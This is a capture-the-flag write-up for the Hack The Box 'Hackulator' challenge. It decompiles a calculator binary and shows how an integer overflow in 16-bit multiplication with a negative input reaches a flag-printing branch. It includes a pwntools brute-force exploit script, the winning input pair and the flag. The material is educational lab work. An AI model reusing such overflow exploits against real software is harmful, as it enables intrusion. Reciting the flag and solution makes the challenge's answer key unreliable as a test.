# Hackulator :heavy_division_sign:

### Description:
* Agent, this device is stolen from the enemy's base. It seems like a normal calculator, but it can perform really bad things, given certain inputs. You must find out how to perform such tricky moves, and use them against our enemies.

### Objective:
* Take advantage of an **Integer Overflow**.

### Flag:
* HTB{d0_u_3v3n_m4th_4g3nt?!}

### Difficulty:
* Easy

### Challenge:

The binary is a x86-64 dynamically linked ELF.

As we can see from checksec, **FULL RELRO** and **NX** are **enabled** while **PIE** and **Canary** are **disabled**. 

```console
gef➤ checksec
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Full
```

The interface of the program looks like this:

```console
$ ./hackulator 
Agent, this calculator is not an ordinary one.
Some operations can do powerful things.
Take advantage of them.

Insert 2 numbers: 2
3
Choose operation:

1. ➕

2. ➖

3. ❌

4. ➗

> 3
2 * 3 = 6

Insert 2 numbers: 12
5
Choose operation:

1. ➕

2. ➖

3. ❌

4. ➗

> 2
12 - 5 = 7

Insert 2 numbers: 71 -2
Choose operation:

1. ➕

2. ➖

3. ❌

4. ➗

> 3
Numbers too big!
Mission failed!
```

### Disassembly :pick:

Let's open IDA in order to analyze the program. Heading to `main()`, we see a call to:

```c
void main(void)

{
  setup();
  puts(
      "Agent, this calculator is not an ordinary one.\nSome operations can do powerfulthings.\nTake advantage of them."
      );
  calc();
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

There is a call to `calc()`:

```c
void calc(void)

{
  ushort uVar1;
  float fVar2;
  uint local_18;
  uint local_14;
  int local_10;
  uint local_c;
  
  printf("\nInsert 2 numbers: ");
  __isoc99_scanf("%d %d",&local_14,&local_18);
  local_10 = menu();
  if ((0x45 < (int)local_14) || (0x45 < (int)local_18)) {
    puts("Numbers too big!\nMission failed!\n");
                    /* WARNING: Subroutine does not return */
    exit(0x22);
  }
  if (local_10 == 2) {
    local_c = sub(local_14,local_18,local_18);
    printf("%d - %d = %d\n",(ulong)local_14,(ulong)local_18,(ulong)local_c);
  }
  else {
    if (local_10 < 3) {
      if (local_10 != 1) {
LAB_004009be:
        puts("Invalid operation, exiting..");
                    /* WARNING: Subroutine does not return */
        exit(0x12);
      }
      local_c = add(local_14,local_18,local_18);
      printf("%d + %d = %d\n",(ulong)local_14,(ulong)local_18,(ulong)local_c);
    }
    else {
      if (local_10 == 3) {
        uVar1 = mult(local_14,local_18,local_18);
        local_c = (uint)uVar1;
        printf("%d * %d = %d\n",(ulong)local_14,(ulong)local_18,(ulong)local_c);
      }
      else {
        if (local_10 != 4) goto LAB_004009be;
        fVar2 = (float)divi(local_14,local_18,local_18);
        local_c = (uint)(long)fVar2;
        printf("%d / %d = %d\n",(ulong)local_14,(ulong)local_18,(long)fVar2 & 0xffffffff);
      }
    }
  }
  if (local_c == 0xfa12) {
    printf("Congratulations agent! Here is your gift: ");
    system("cat flag*");
  }
  else {
    calc();
  }
  return;
}
```

There is a call to *menu()* that is assigned to `local_10`. It then calls the corresponding functions:

* add()
* sub()
* mult()
* divi()

All in one:

```c
int add(int param_1,int param_2)

{
  return param_2 + param_1;
}

int sub(int param_1,int param_2)

{
  return param_1 - param_2;
}

int mult(int param_1,int param_2)

{
  return param_1 * param_2;
}

float divi(int param_1,int param_2)

{
  if (param_2 == 0) {
    puts("Divide with 0?! Not even this calculator can do this Agent..\n");
                    /* WARNING: Subroutine does not return */
    exit(0xd);
  }
  return (float)(param_1 / param_2);
}
```

Stepping into **menu()**, we see that the logic for the calculator menu, where we can choose between 4 operations. There is a scanf() that reads our choice and returns.

```c
undefined4 menu(void)

{
  undefined4 local_c;
  
  puts("Choose operation:\n");
  puts(&DAT_00400b09);
  puts(&DAT_00400b11);
  puts(&DAT_00400b19);
  puts(&DAT_00400b21);
  printf("> ");
  __isoc99_scanf(&DAT_00400b2c,&local_c);
  return local_c;
}
```

For each number between 1-4, a function call occurs, otherwise an "invalid operation" option is called and the program exits. Each operation works as it should and the result is then printed.

So, what we need to do is make `local_c ()` (which is the result of the operation) have the value: `0xfa12`.

```c
  if (local_c == 0xfa12) {
    printf("Congratulations agent! Here is your gift: ");
    system("cat flag*");
  }
  else {
    calc();
  }
```

This seems impossible because the biggest number we can insert is less than 70. (70*70=4900). 0xfa12 = 64018, which is a lot bigger than 4900.

Now that we have disassembled our program and we know what we need to do, let's debug it.

### Debugging :beetle:

Taking a closer look at the operations, we see something odd. In **"multiplication"**, there is a **short** assignment before the result.

```c
if (local_10 == 3) {
    uVar1 = mult(local_14,local_18,local_18);
    local_c = (uint)uVar1;
    printf("%d * %d = %d\n",(ulong)local_14,(ulong)local_18,(ulong)local_c);
}
```

Instead of being `ulong`, `local_c`is just `uint`, which uses less bytes than `ulong`.

A **short integer** is 16 bits or 2 bytes long. In this situation, a negative number might need more than that in order to be stored, resulting in an **integer overflow**. The same thing happens for integers and long integers.

Some fuzzing makes this pretty clear.  

```c
./hackulator 
Agent, this calculator is not an ordinary one.
Some operations can do powerful things.
Take advantage of them.

Insert 2 numbers: 2
-100
Choose operation:

1. ➕

2. ➖

3. ❌

4. ➗

> 3
2 * -100 = 65336

Insert 2 numbers: 2 -100
Choose operation:

1. ➕

2. ➖

3. ❌

4. ➗

> 1
2 + -100 = -98
```

It's obvious that there's an overflow when performing multiplication. The only thing that is left now is to find the correct pair of numbers in order to satisfy the condition. There are plenty of methods to do so.

* Trial and error.   
* Brute forcing.
* Calculating the result.

In my exploit I used brute forcing.

### Exploit :scroll:

```python
#!/usr/bin/python3
usr/bin/python3
from pwn import *

ip = '172.17.0.1' # change this
port = 1337 # change this
fname = './hackulator' # change this

LOCAL = False

if LOCAL:
	r = process(fname)
else:
	r = remote(ip, port)

rl = lambda : r.recvline()
ru = lambda x : r.recvuntil(x)
sla = lambda x,y : r.sendlineafter(x,y)

def pwn():
	for i in range (20,70):	 					# try positive numbers 
		for k in range (-1,-100,-1): 			# try negative numbers
			payload = str(i) + ' ' + str(k)		# craft payload
			r.sendlineafter('Insert 2 numbers:',payload)	
			payload = '3' 						# Choose multiplication				
			sla('>', payload)
			rl()
			ln = r.recvline()	# if we found the correct result
			if b'HTB' in ln:
				print('Pair of numbers: ({})*({})'.format(i,k))
				print((b'Flag: HTB' + ln.split(b'HTB')[1]).decode())
				exit()

if __name__ == '__main__':
	pwn()

```
### PoC :black_flag:

```console
$ ./solver.py 
[+] Opening connection to 172.17.0.1 on port 1337: Done
Pair of numbers: (22)*(-69)
Flag: HTB{d0_u_3v3n_m4th_4g3nt?!}
```
